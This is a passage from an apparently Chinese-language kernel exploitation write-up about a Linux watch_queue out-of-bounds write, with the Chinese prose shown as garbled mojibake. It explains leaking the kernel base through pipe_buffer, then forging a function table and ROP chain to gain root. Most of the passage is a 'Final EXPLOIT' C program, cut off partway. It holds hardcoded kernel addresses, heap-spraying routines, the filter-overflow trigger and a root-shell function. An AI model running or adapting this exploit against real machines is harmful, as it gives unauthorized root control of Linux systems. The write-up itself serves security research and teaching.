len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buffer</code> ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°è¡¨æˆå‘˜ <code>pipe_buf_operations</code> ï¼Œå…¶æŒ‡å‘å†…æ ¸ä¸­çš„å‡½æ•°è¡¨ <code>anon_pipe_buf_ops</code>ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿå°†å…¶è¯»å‡ºï¼Œä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åŸºå€ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥ object é‡å› slub ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥ object</li><li>å–·å°„ <code>pipe_buffer</code>ï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œ<strong>æˆ‘ä»¬ä¾¿èƒ½è¯»å‡º pipe_buffer ä¸Šæ•°æ®ï¼Œæ³„éœ²å†…æ ¸åŸºå€</strong></li></ul><h3 id="Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ"><a href="#Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ" class="headerlink" title="Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ"></a>Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œè€Œ UAF object çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ sk_buff åœ¨ UAF object ä¸Šä¼ªé€ å‡½æ•°è¡¨ä¸æ„é€  ROP chainï¼Œå†é€‰ä¸€æ¡è¶³å¤Ÿåˆé€‚çš„ gadget å®Œæˆæ ˆè¿ç§»ä¾¿èƒ½åŠ«æŒ RIP å®Œæˆææƒ</strong></p><p><img src="https://s2.loli.net/2022/04/06/P8AlaFMCqeSObn2.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼ˆåŸºæœ¬ä¸Šå°±æ˜¯æŠŠ CVE-2021-22555 çš„ exp é‡Œ trigger oob çš„å‡½æ•°æ”¹ä¸€ä¸‹å°±èƒ½æ‰“é€šäº†ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/watch_queue.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> *<span class="hljs-title">wfilter</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfilters;<br>    <br>    nfilters = <span class="hljs-number">4</span>;<br>    wfilter = (<span class="hljs-keyword">struct</span> watch_notification_filter*)<br>            <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_filter)<br>                + nfilters * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_type_filter));<br>    wfilter-&gt;nr_filters = nfilters;<br><br>    <span class="hljs-comment">// normal filter</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (nfilters - <span class="hljs-number">1</span>); i++)<br>        wfilter-&gt;filters[i].type = <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">// evil filter</span><br>    <span class="hljs-comment">// 0x300 = 64 * 12, 12 * 8 = 96bytes</span><br>    <span class="hljs-comment">// 1 &lt;&lt; 0xa = 1024, maybe we can hit a proper bit</span><br>    wfilter-&gt;filters[nfilters - <span class="hljs-number">1</span>].type = <span class="hljs-number">0x30a</span>;<br><br>    <span class="hljs-comment">// triger oob write</span><br>    <span class="hljs-keyword">if</span> (ioctl(pipe_fd[<span class="hljs-number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);<br>    <br>    <span class="hljs-comment">// prevent memory leak in userspace(no need in fact)</span><br>    <span class="hljs-built_in">free</span>(wfilter);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span 